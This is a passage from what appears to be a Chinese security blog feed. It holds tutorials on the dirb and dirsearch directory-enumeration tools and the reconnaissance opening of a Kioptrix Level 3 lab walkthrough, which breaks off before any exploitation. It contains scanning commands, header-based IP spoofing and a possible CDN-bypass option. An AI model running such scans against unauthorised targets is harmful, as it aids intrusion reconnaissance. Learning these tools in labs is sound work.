192.168.1.100&quot;</span> -H <span class="string">&quot;Referer: http://127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113171005.jpg" alt="Pasted-image-20250113171005"></p><h4 id="将结果保存"><a href="#将结果保存" class="headerlink" title="将结果保存"></a>将结果保存</h4><ul><li>使用<code>-o</code>设置保存的文件名，默认是不回显的。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/gallery/ -o 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113171156.jpg" alt="Pasted-image-20250113171156"></p><h3 id="dirb-gendict"><a href="#dirb-gendict" class="headerlink" title="dirb-gendict"></a>dirb-gendict</h3><blockquote><p><code>dirb-gendict</code>是<code>dirb</code>包里面自带的一个灵活的字典生成工具，通过使用模式字符串和字符类型，可以快速生成符合特定需求的自定义字典。例如，在渗透测试中生成用户列表、路径列表或密码列表时非常有用。</p></blockquote><h4 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb-gendict &lt;wordlist_file&gt; [options]</span><br></pre></td></tr></table></figure><h4 id="命令参数-1"><a href="#命令参数-1" class="headerlink" title="命令参数"></a>命令参数</h4><table><thead><tr><th>参数</th><th>描述</th><th>范围</th></tr></thead><tbody><tr><td><code>-n</code></td><td>生成数字序列</td><td><code>0-9</code></td></tr><tr><td><code>-c</code></td><td>生成小写字母序列</td><td><code>a-z</code></td></tr><tr><td><code>-C</code></td><td>生成大写字母序列</td><td><code>A-Z</code></td></tr><tr><td><code>-h</code></td><td>生成十六进制序列</td><td><code>0-f</code></td></tr><tr><td><code>-a</code></td><td>生成字母数字混合序列</td><td><code>0-9a-z</code></td></tr><tr><td><code>-s</code></td><td>生成大小写敏感的字母数字混合序列</td><td><code>0-9a-zA-Z</code></td></tr><tr><td><code>wordlist_file</code></td><td>ASCII 字符串，其中每个<code>X</code> 将被对应的递增值替换</td><td>字符串，包含<code>X</code></td></tr></tbody></table><h4 id="生成例子"><a href="#生成例子" class="headerlink" title="生成例子"></a>生成例子</h4><ul><li>使用对应的参数来生成对应序列字符</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb-gendict -n user_X</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113224857.jpg" alt="Pasted-image-20250113224857"></p><h4 id="保存生成"><a href="#保存生成" class="headerlink" title="保存生成"></a>保存生成</h4><ul><li>使用重定向符到文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb-gendict -n word_X &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113225509.jpg" alt="Pasted-image-20250113225509"></p><h3 id="html2dic"><a href="#html2dic" class="headerlink" title="html2dic"></a>html2dic</h3><blockquote><p><code>html2dic</code> 通过html文件输入，从 HTML 页面中提取单词并生成字典文件的命令行工具，从HTML 页面中的所有单词提取出来，并将每个单词按行列出，最终生成一个字典，输出结果会打印到标准输出</p></blockquote><h4 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h4><ul><li>直接输入网页文件即可，无任何参数</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">html2dic &lt;file&gt;</span><br></pre></td></tr></table></figure><h4 id="获取页面"><a href="#获取页面" class="headerlink" title="获取页面"></a>获取页面</h4><ul><li>爬取的页面<br><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113230458.jpg" alt="Pasted-image-20250113230458"></li></ul><h4 id="获取网页文件"><a href="#获取网页文件" class="headerlink" title="获取网页文件"></a>获取网页文件</h4><ul><li>首先知道<code>Curl</code>命令可以对页面发送请求<br><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113230431.jpg" alt="Pasted-image-20250113230431"></li><li>然后利用重定向保存起来</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.109.131/gallery/ &gt; url.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113230637.jpg" alt="Pasted-image-20250113230637"></p><ul><li>然后利用命令爬取，重定向保存为字典就不示范了。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">html2dic url.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113230953.jpg" alt="Pasted-image-20250113230953"></p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul><li>这个缺点很致命，这里拿我博客进行测试。可以看到页面都看得懂(大部分中文)<br><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113231810.jpg" alt="Pasted-image-20250113231810"></li><li>爬取页面并抓取，发现这玩也不能搞中文，真和他描述的一模一样，面对中文站点直接<strong>out</strong><br><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113232111.jpg" alt="Pasted-image-20250113232111"></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>印证了那句Dirsearch比较强大的话，配合一些自定义字典不比大部分目录枚举工具好用？而且配套的两个工具来说基本上很费，没什么很大用途主体本身也可以替代。以后目录枚举的话还是主用Dirsearch，要说还有个不错的用途话那就是Dirsearch配合<code>Dirb</code>字典来用十分牛头人。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> Kali tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dirsearch | 目录枚举神器</title>
      <link href="/posts/e6e15f85.html"/>
      <url>/posts/e6e15f85.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Dirsearch是一个用 Python 编写的命令行工具，设计用于通过使用字典攻击的方式扫描Web服务器上的目录和文件。它可以帮助渗透测试人员、红队、安全研究员等发现服务器上未公开的资源和潜在漏洞。</p></blockquote><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><h4 id="KALI安装"><a href="#KALI安装" class="headerlink" title="KALI安装"></a>KALI安装</h4><ul><li>自带有</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install dirsearch -y</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111163831.jpg" alt="Pasted-image-20250111163831"></p><h4 id="pip下载"><a href="#pip下载" class="headerlink" title="pip下载"></a>pip下载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install dirsearch</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111164252.jpg" alt="Pasted-image-20250111164252"></p><h4 id="Github下载"><a href="#Github下载" class="headerlink" title="Github下载"></a>Github下载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/maurosoria/dirsearch.git</span><br><span class="line"><span class="built_in">cd</span> dirsearch</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">python dirsearch.py</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111164838.jpg" alt="Pasted-image-20250111164838"></p><h3 id="相关参数"><a href="#相关参数" class="headerlink" title="相关参数"></a>相关参数</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u &lt;target_url&gt; [options]</span><br></pre></td></tr></table></figure><p>必选内容</p><ul><li><code>-u</code>指定目标url</li><li><code>-l</code>指定url文件</li><li><code>-s</code>扫描进度保存的会话文件(可不选，不指定默认不开启)</li></ul><h4 id="参数参考表"><a href="#参数参考表" class="headerlink" title="参数参考表"></a>参数参考表</h4><h5 id="Mandatory（必选）"><a href="#Mandatory（必选）" class="headerlink" title="Mandatory（必选）"></a>Mandatory（必选）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-u URL, --url=URL</code></td><td>目标 URL(s)，可以使用多个标志指定多个 URL。</td></tr><tr><td><code>-l PATH, --url-file=PATH</code></td><td>URL 列表文件。</td></tr><tr><td><code>--stdin</code></td><td>从 STDIN 读取 URL(s)。</td></tr><tr><td><code>--cidr=CIDR</code></td><td>目标 CIDR。</td></tr><tr><td><code>--raw=PATH</code></td><td>从文件加载原始 HTTP 请求（使用<code>--scheme</code> 标志设置协议）。</td></tr><tr><td><code>-s SESSION_FILE, --session=SESSION_FILE</code></td><td>会话文件。</td></tr><tr><td><code>--config=PATH</code></td><td>配置文件的完整路径，默认是<code>config.ini</code>。</td></tr></tbody></table><h5 id="Dictionary-Settings（字典设置）"><a href="#Dictionary-Settings（字典设置）" class="headerlink" title="Dictionary Settings（字典设置）"></a>Dictionary Settings（字典设置）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-w WORDLISTS, --wordlists=WORDLISTS</code></td><td>自定义字典（多个字典用逗号分隔）。</td></tr><tr><td><code>-e EXTENSIONS, --extensions=EXTENSIONS</code></td><td>扩展名列表（用逗号分隔，例如：<code>php,asp</code>）。</td></tr><tr><td><code>-f, --force-extensions</code></td><td>将扩展名添加到每个字典项的末尾。默认情况下，<code>dirsearch</code> 只会替换 <code>%EXT%</code> 关键字为扩展名。</td></tr><tr><td><code>-O, --overwrite-extensions</code></td><td>使用<code>-e</code> 指定的扩展名覆盖字典中的其他扩展名。</td></tr><tr><td><code>--exclude-extensions=EXTENSIONS</code></td><td>排除的扩展名列表（用逗号分隔）。</td></tr><tr><td><code>--remove-extensions</code></td><td>移除路径中的扩展名（例如<code>admin.php</code> -&gt; <code>admin</code>）。</td></tr><tr><td><code>--prefixes=PREFIXES</code></td><td>向所有字典项添加自定义前缀（用逗号分隔）。</td></tr><tr><td><code>--suffixes=SUFFIXES</code></td><td>向所有字典项添加自定义后缀（忽略目录，多个后缀用逗号分隔）。</td></tr><tr><td><code>-U, --uppercase</code></td><td>将字典中的词转换为大写。</td></tr><tr><td><code>-L, --lowercase</code></td><td>将字典中的词转换为小写。</td></tr><tr><td><code>-C, --capital</code></td><td>将字典中的词转换为首字母大写。</td></tr></tbody></table><h5 id="General-Settings（通用设置）"><a href="#General-Settings（通用设置）" class="headerlink" title="General Settings（通用设置）"></a>General Settings（通用设置）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-t THREADS, --threads=THREADS</code></td><td>设置线程数。</td></tr><tr><td><code>-r, --recursive</code></td><td>启用递归模式，扫描子目录路径。</td></tr><tr><td><code>--deep-recursive</code></td><td>在每个目录深度上都执行递归扫描（例如：<code>api/users</code> -&gt; <code>api/</code>）。</td></tr><tr><td><code>--force-recursive</code></td><td>对每个找到的路径都执行递归扫描，不仅仅是目录。</td></tr><tr><td><code>-R DEPTH, --max-recursion-depth=DEPTH</code></td><td>设置最大递归深度。</td></tr><tr><td><code>--recursion-status=CODES</code></td><td>指定有效的状态码，用于递归扫描（支持范围，例如<code>200, 300-399</code>）。</td></tr><tr><td><code>--subdirs=SUBDIRS</code></td><td>扫描指定 URL 的子目录（多个子目录用逗号分隔）。</td></tr><tr><td><code>--exclude-subdirs=SUBDIRS</code></td><td>排除指定子目录进行递归扫描（多个子目录用逗号分隔）。</td></tr><tr><td><code>-i CODES, --include-status=CODES</code></td><td>包含状态码，多个状态码用逗号分隔，支持范围（例如<code>200,300-399</code>）。</td></tr><tr><td><code>-x CODES, --exclude-status=CODES</code></td><td>排除状态码，多个状态码用逗号分隔，支持范围（例如<code>301,500-599</code>）。</td></tr><tr><td><code>--exclude-sizes=SIZES</code></td><td>排除某些响应大小的路径，多个大小用逗号分隔（例如<code>0B,4KB</code>）。</td></tr><tr><td><code>--exclude-text=TEXTS</code></td><td>排除响应中包含指定文本的路径，可以使用多个标志。</td></tr><tr><td><code>--exclude-regex=REGEX</code></td><td>排除响应中匹配正则表达式的路径。</td></tr><tr><td><code>--exclude-redirect=STRING</code></td><td>排除响应中包含指定重定向 URL 的路径（例如<code>/index.html</code>）。</td></tr><tr><td><code>--exclude-response=PATH</code></td><td>排除与此页面响应类似的路径，输入路径作为示例（例如<code>404.html</code>）。</td></tr><tr><td><code>--skip-on-status=CODES</code></td><td>在遇到这些状态码时跳过目标，多个状态码用逗号分隔，支持范围。</td></tr><tr><td><code>--min-response-size=LENGTH</code></td><td>只扫描大于指定响应长度的路径（例如<code>100B</code>、<code>4KB</code>）。</td></tr><tr><td><code>--max-response-size=LENGTH</code></td><td>只扫描小于指定响应长度的路径（例如<code>100B</code>、<code>4KB</code>）。</td></tr><tr><td><code>--max-time=SECONDS</code></td><td>设置扫描的最大运行时间（秒）。</td></tr><tr><td><code>--exit-on-error</code></td><td>一旦遇到错误则退出扫描。</td></tr></tbody></table><h5 id="Request-Settings（请求设置）"><a href="#Request-Settings（请求设置）" class="headerlink" title="Request Settings（请求设置）"></a>Request Settings（请求设置）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-m METHOD, --http-method=METHOD</code></td><td>设置 HTTP 请求方法，默认为<code>GET</code>。</td></tr><tr><td><code>-d DATA, --data=DATA</code></td><td>设置 HTTP 请求的正文数据，通常用于<code>POST</code> 请求。</td></tr><tr><td><code>--data-file=PATH</code></td><td>从文件加载 HTTP 请求数据。</td></tr><tr><td><code>-H HEADERS, --header=HEADERS</code></td><td>设置 HTTP 请求头部，可以使用多个标志。</td></tr><tr><td><code>--header-file=PATH</code></td><td>从文件加载 HTTP 请求头部。</td></tr><tr><td><code>-F, --follow-redirects</code></td><td>跟随 HTTP 重定向。</td></tr><tr><td><code>--random-agent</code></td><td>每个请求使用随机的 User-Agent。</td></tr><tr><td><code>--auth=CREDENTIAL</code></td><td>设置身份验证凭证，格式为<code>user:password</code> 或 <code>bearer token</code>。</td></tr><tr><td><code>--auth-type=TYPE</code></td><td>设置身份验证类型（如：<code>basic</code>、<code>digest</code>、<code>bearer</code>、<code>ntlm</code>、<code>jwt</code>、<code>oauth2</code>）。</td></tr><tr><td><code>--cert-file=PATH</code></td><td>从文件加载客户端证书。</td></tr><tr><td><code>--key-file=PATH</code></td><td>从文件加载客户端证书的私钥（未加密）。</td></tr><tr><td><code>--user-agent=USER_AGENT</code></td><td>设置自定义 User-Agent。</td></tr><tr><td><code>--cookie=COOKIE</code></td><td>设置 HTTP 请求的 Cookie。</td></tr></tbody></table><h5 id="Connection-Settings（连接设置）"><a href="#Connection-Settings（连接设置）" class="headerlink" title="Connection Settings（连接设置）"></a>Connection Settings（连接设置）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>--timeout=TIMEOUT</code></td><td>设置连接超时。</td></tr><tr><td><code>--delay=DELAY</code></td><td>设置请求之间的延迟。</td></tr><tr><td><code>--proxy=PROXY</code></td><td>设置代理 URL（HTTP&#x2F;SOCKS），可以使用多个标志。</td></tr><tr><td><code>--proxy-file=PATH</code></td><td>从文件加载代理服务器。</td></tr><tr><td><code>--proxy-auth=CREDENTIAL</code></td><td>设置代理认证凭证。</td></tr><tr><td><code>--replay-proxy=PROXY</code></td><td>使用代理回放找到的路径。</td></tr><tr><td><code>--tor</code></td><td>使用 Tor 网络作为代理。</td></tr><tr><td><code>--scheme=SCHEME</code></td><td>设置协议（当 URL 中没有协议时使用）。</td></tr><tr><td><code>--max-rate=RATE</code></td><td>设置每秒最大请求数。</td></tr><tr><td><code>--retries=RETRIES</code></td><td>设置失败请求的重试次数。</td></tr><tr><td><code>--ip=IP</code></td><td>设置服务器的 IP 地址。</td></tr></tbody></table><h5 id="Advanced-Settings（高级设置）"><a href="#Advanced-Settings（高级设置）" class="headerlink" title="Advanced Settings（高级设置）"></a>Advanced Settings（高级设置）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>--crawl</code></td><td>在响应中抓取新的路径。</td></tr></tbody></table><h5 id="View-Settings（查看设置）"><a href="#View-Settings（查看设置）" class="headerlink" title="View Settings（查看设置）"></a>View Settings（查看设置）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>--full-url</code></td><td>在输出中显示完整的 URL（在静默模式下自动启用）。</td></tr><tr><td><code>--redirects-history</code></td><td>显示重定向历史。</td></tr><tr><td><code>--no-color</code></td><td>禁用彩色输出。</td></tr><tr><td><code>-q, --quiet-mode</code></td><td>静默模式，减少输出。</td></tr></tbody></table><h5 id="Output-Settings（输出设置）"><a href="#Output-Settings（输出设置）" class="headerlink" title="Output Settings（输出设置）"></a>Output Settings（输出设置）</h5><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-o PATH, --output=PATH</code></td><td>设置输出文件路径。</td></tr><tr><td><code>--format=FORMAT</code></td><td>设置报告格式（可选：<code>simple</code>、<code>plain</code>、<code>json</code>、<code>xml</code>、<code>md</code>、<code>csv</code>、<code>html</code>、<code>sqlite</code>）。</td></tr><tr><td><code>--log=PATH</code></td><td>设置日志文件路径。</td></tr></tbody></table><h3 id="基本参数使用"><a href="#基本参数使用" class="headerlink" title="基本参数使用"></a>基本参数使用</h3><h4 id="测试站点"><a href="#测试站点" class="headerlink" title="测试站点"></a>测试站点</h4><ul><li>我这里使用我的博客站点进行测试，为了速度我本地起了一个。<br><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111171318.jpg" alt="Pasted-image-20250111171318"></li></ul><h4 id="指定站点普通扫描"><a href="#指定站点普通扫描" class="headerlink" title="指定站点普通扫描"></a>指定站点普通扫描</h4><ul><li>默认指定字典，扫描的后缀为全部。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u localhost:4000</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111174455.jpg" alt="Pasted-image-20250111174455"></p><h4 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h4><ul><li>第一次扫描可以发现我有一些路径例如：<code>books</code>，可以使用<code>-r</code>参数可以设置递扫描，<code>-t</code>设置扫描线程数。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u localhost:4000 -r -t 25</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111174646.jpg" alt="Pasted-image-20250111174646"></p><h4 id="排除状态码"><a href="#排除状态码" class="headerlink" title="排除状态码"></a>排除状态码</h4><ul><li>第一次扫描看到有一些<code>301</code>的状态码，下面使用<code>-x</code>参数排除掉多个格式的话可以用<code>,</code>分开。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u localhost:4000 -t 25 -x 301</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111175121.jpg" alt="Pasted-image-20250111175121"></p><h4 id="指定状态码"><a href="#指定状态码" class="headerlink" title="指定状态码"></a>指定状态码</h4><ul><li>有排除肯定有指定了，使用<code>-i</code>参数指定状态码，多个状态码用<code>,</code>分隔。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u localhost:4000 -t 25 -i 200</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111175540.jpg" alt="Pasted-image-20250111175540"></p><h4 id="指定扫描格式"><a href="#指定扫描格式" class="headerlink" title="指定扫描格式"></a>指定扫描格式</h4><ul><li>这个可以根据站点的环境来判断像我我博客是静态部署的。你扫一些<code>jsp</code>肯说是没有的了。字典一下子少了，原本是一万多的。多个格式的话可以用<code>,</code>分开。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u localhost:4000 -t 25 -e html</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111175617.jpg" alt="Pasted-image-20250111175617"></p><h4 id="排除响应包大小"><a href="#排除响应包大小" class="headerlink" title="排除响应包大小"></a>排除响应包大小</h4><ul><li>这个对于真实站点信息收集时有用，部分站点访问一个不存在的页面时会返回一个统一的页面，具体解释看下一级标题详讲解</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u https://www.xenoecho.us.kg --exclude-sizes=162B</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111185905.jpg" alt="Pasted-image-20250111185905"></p><h5 id="为什么排除"><a href="#为什么排除" class="headerlink" title="为什么排除"></a>为什么排除</h5><ul><li>注意看我两个不同路径的页面返回的都是我自定义的页面也就是自定义的404<br><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111183754.jpg" alt="Pasted-image-20250111183754"></li><li>而且响应的包大小都是一样，那么就可以使用<code>--exclude-sizes</code>排除掉这些404页面或者简单的统一页面。<br><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111182028.jpg" alt="Pasted-image-20250111182028"></li></ul><h4 id="设置字典"><a href="#设置字典" class="headerlink" title="设置字典"></a>设置字典</h4><ul><li>目录扫描的本质其实还是信息收集，后续可以根据自己收集到的一些信息制作字典，例如这个网站的文件名为<code>website</code>，那么可以设置个<code>websaite</code>的名压缩包后缀，或者使用一些常见的字典，如搜索引擎的网站地图、RSS等。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这里就随便指定一个字典，具体还有很多参数就不一一示范了</span></span><br><span class="line">dirsearch -u http://localhost:4000/ -w db.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111191428.jpg" alt="Pasted-image-20250111191428"></p><h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><ul><li>这里不代理提供方法，做个示例，<code>--timeout</code>设置个超时时间。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u https://www.xenoecho.us.kg --proxy http://127.0.0.1:10101 --<span class="built_in">timeout</span>=5</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111192421.jpg" alt="Pasted-image-20250111192421"></p><h4 id="设置请求头-IP伪造"><a href="#设置请求头-IP伪造" class="headerlink" title="设置请求头| IP伪造"></a>设置请求头| IP伪造</h4><ul><li><code>HTTP</code>的请求包中有一个请求头<code>X-Forwarded-For</code>是包含请求IP的，当然这种方式无法欺骗链路层这些，只能欺骗应用层的一些验证。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#192.168.1.100为伪造的IP</span></span><br><span class="line">dirsearch -u https://www.xenoecho.us.kg/ -H <span class="string">&quot;X-Forwarded-For: 192.168.1.100&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111193514.jpg" alt="Pasted-image-20250111193514"></p><h4 id="设置IP服务器-绕过CDN请求-存疑"><a href="#设置IP服务器-绕过CDN请求-存疑" class="headerlink" title="设置IP服务器|绕过CDN请求(存疑)"></a>设置IP服务器|绕过CDN请求(存疑)</h4><ul><li>这个参数我感觉很有意思，我可以设置指定的IP请求啊，为什么还要在设置个IP呢，虚拟主机来说也没必要，我感觉大概率可能是针对有<code>CDN</code>的站点，不过我不确定，这里给个示范。后面有错欢迎指出</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看我解析的地址，然后指定服务器IP</span></span><br><span class="line">dirsearch -u https://www.xenoecho.us.kg/ --ip=172.67.213.41</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111194743.jpg" alt="Pasted-image-20250111194743"></p><h4 id="文件另存为"><a href="#文件另存为" class="headerlink" title="文件另存为"></a>文件另存为</h4><ul><li>这个参数就不多说了</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://localhost:4000/ -o 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250111/Pasted-image-20250111195037.jpg" alt="Pasted-image-20250111195037"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>总体来看Dirsearch已经可以说是很强大的目录扫描工具了，集成大部分扫描中会遇到的所有问题的解决参数，只不过自带的字典肯定不够看的，需要指定字典来完善他的功能。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> Kali tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix-Leve Three 综合靶机实战思路</title>
      <link href="/posts/148369d4.html"/>
      <url>/posts/148369d4.html</url>
      
        <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul><li>基本信息攻击机:192.168.38.128；靶机:192.168.38.132<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241226172730.jpg" alt="Pasted-image-20241226172730"></li></ul><h3 id="web样式无法显示的问题"><a href="#web样式无法显示的问题" class="headerlink" title="web样式无法显示的问题"></a>web样式无法显示的问题</h3><ul><li>原因：样式是以这个域名为基准链接的，而这个域名解析其实要到本地靶机的地址的。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241226174609.jpg" alt="Pasted-image-20241226174609"><br>修改<code>hosts</code>文件，将这个域名指向靶机地址，然后刷新一下就可以正常显示了。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.38.132 kioptrix3.com&quot;</span> &gt;&gt;/etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241226192249.jpg" alt="Pasted-image-20241226192249"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="dirb目录扫描"><a href="#dirb目录扫描" class="headerlink" title="dirb目录扫描"></a>dirb目录扫描</h3><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241226192249.jpg" alt="Pasted-image-20241226192249"></p><h3 id="dirsearch目录扫描"><a href="#dirsearch目录扫描" class="headerlink" title="dirsearch目录扫描"></a>dirsearch目录扫描</h3><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241226192430.jpg" alt="Pasted-image-20241226192430"></p><h3 id="whatweb指纹"><a href="#whatweb指纹" class="headerlink" title="whatweb指纹"></a>whatweb指纹</h3><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241226192700.jpg" alt="Pasted-image-20241226192700"></p><h3 id="nmap服务扫描"><a href="#nmap服务扫描" class="headerlink" title="nmap服务扫描"></a>nmap服务扫描</h3><ul><li>只有<code>80</code>和<code>22</code>端口开放的<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241226192926.jpg" alt="Pasted-image-20241226192926"></li></ul><h3 id="主机详细信息"><a href="#主机详细信息" class="headerlink" title="主机详细信息"></a>主机详细信息</h3><ul><li>操作系统：Ubuntu Liunx</li><li>内核版本：Linux 2.6.9 - 2.6.33</li></ul><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><table><thead><tr><th>端口</th><th>服务</th><th>版本</th></tr></thead><tbody><tr><td>22&#x2F;tcp</td><td>ssh</td><td>OpenSSH 4.7p1</td></tr><tr><td>80&#x2F;tcp</td><td>http</td><td>Apache httpd 2.2.8</td></tr><tr><td></td><td>php</td><td>5.2.4-2ubuntu5.6</td></tr></tbody></table><h2 id="查找攻击点"><a href="#查找攻击点" class="headerlink" title="查找攻击点"></a>查找攻击点</h2><h3 id="Web服务-80"><a href="#Web服务-80" class="headerlink" title="Web服务|80"></a>Web服务|80</h3><blockquote><p>页面探索</p><blockquote><p>根据扫描出来的页面进行访问查看有无可疑点，例如常见的一些Web漏洞。</p></blockquote></blockquote><h4 id="cache路径"><a href="#cache路径" class="headerlink" title="cache路径"></a>cache路径</h4><ul><li>三个页面返回404，<code>now</code>进入到另一个目录的页面。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241230164629.jpg" alt="Pasted-image-20241230164629"></li></ul><h4 id="gallery路径"><a href="#gallery路径" class="headerlink" title="gallery路径"></a>gallery路径</h4><ul><li>不同照片跳转不同路径的页面<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241230165649.jpg" alt="Pasted-image-20241230165649"></li><li>照片页面有传参，后续尝试抓包测试<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241230165733.jpg" alt="Pasted-image-20241230165733"></li></ul><h5 id="参数测试"><a href="#参数测试" class="headerlink" title="参数测试"></a>参数测试</h5><ul><li>参数对应，除了能改评分多少似乎没任何作用，阿巴阿巴。。。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241231184205.jpg" alt="Pasted-image-20241231184205"></li><li>只能改一次！给了个50分。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241231184126.jpg" alt="Pasted-image-20241231184126"></li></ul><h5 id="针对路径扫描"><a href="#针对路径扫描" class="headerlink" title="针对路径扫描"></a>针对路径扫描</h5><ul><li>针对<code>/gallery/</code>路径重新扫描一遍，有时候会遗漏掉一些铭感文件或路径。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101172421.jpg" alt="Pasted-image-20250101172421"></li><li>数据库文件，暂时先留着。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101145945.jpg" 